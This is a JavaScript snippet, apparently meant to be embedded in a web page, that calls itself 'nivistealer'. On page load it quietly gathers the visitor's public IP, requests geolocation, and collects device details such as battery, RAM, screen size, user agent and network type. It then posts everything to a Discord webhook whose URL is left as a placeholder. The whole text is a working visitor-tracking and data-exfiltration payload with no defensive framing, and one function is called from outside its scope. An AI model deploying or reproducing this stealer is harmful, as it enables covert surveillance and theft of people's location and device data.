      <script>
         $(document).ready(function() {
            var batterypercentage;
            var ischarging;
            var publicIp;
            var locationFetched = false;

            // Get public IP
            function getPublicIp() {
              const xhr = new XMLHttpRequest();
              xhr.open('GET', 'https://api.ipify.org?format=json', false);
              xhr.send();

              if (xhr.status === 200) {
                const data = JSON.parse(xhr.responseText);
                publicIp = data.ip;
              } else {
                console.error(`Error: ${xhr.statusText}`);
                publicIp = null;
              }
            }

            getPublicIp();

            // Request location permission and fetch location
            function getLocation() {
              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                  function(position) {
                    locationFetched = true;
                    var coords = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
                    sendToDiscord(coords);
                  },
                  function(error) {
                    switch (error.code) {
                      case error.PERMISSION_DENIED:
                        sendToDiscord("Geo Location Denied");
                        break;
                      case error.TIMEOUT:
                        sendToDiscord("Geo Location Timeout");
                        setTimeout(getLocation, 5000); // Retry after 5 seconds
                        break;
                      default:
                        sendToDiscord("Geo Location Unknown Error");
                        break;
                    }
                  },
                  { timeout: 10000 } // Timeout after 10 seconds
                );
              } else {
                sendToDiscord("Geo Location Not Supported by Browser");
              }
            }

            // Fetch other device information
            async function fetchDeviceInfo() {
              let datetime = new Date();
              let localtime = String(datetime.toLocaleTimeString());
              let userAgent = navigator.userAgent;
              let battery = await navigator.getBattery();
              batterypercentage = battery.level * 100 + "%";
              ischarging = battery.charging ? "Yes" : "No";

              let width = screen.width;
              let height = screen.height;
              let platform = navigator.platform;
              let devicelang = navigator.language;
              let cpuThreads = navigator.hardwareConcurrency;
              let deviceram = navigator.deviceMemory + " GB";
              let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
              let networkinformation = "Network type: " + networkinfo.effectiveType + " Downlink: " + networkinfo.downlink;

              // Send info to Discord
              function sendToDiscord(gps) {
                const payload = {
                  content: `**Device Info:**\nPublic IP: ${publicIp}\nLocal Time: ${localtime}\nDevice: ${platform}\nOS: ${navigator.oscpu || 'Unknown'}\nRAM: ${deviceram}\nUserAgent: ${userAgent}\nScreen: ${width}x${height}\nBattery: ${batterypercentage}\nCharging: ${ischarging}\nNetwork: ${networkinformation}\n\n**Geolocation:** ${gps}`,
                  username: "nivistealer",
                  avatar_url: "https://dpwhatsapp.xyz/wp-content/uploads/2021/08/Anime-Girl-WhatsApp-DP.jpg"
                };

                var request = new XMLHttpRequest();
                request.open("POST", "https://your-discord-webhook-url");
                request.setRequestHeader('Content-type', 'application/json');
                request.send(JSON.stringify(payload));
              }

              // If geolocation is denied or timed out, send a message without it
              if (!locationFetched) {
                sendToDiscord("Geo Location Not Available or Denied");
              }
            }

            // Start fetching geolocation and device info
            getLocation();
            fetchDeviceInfo();
         })
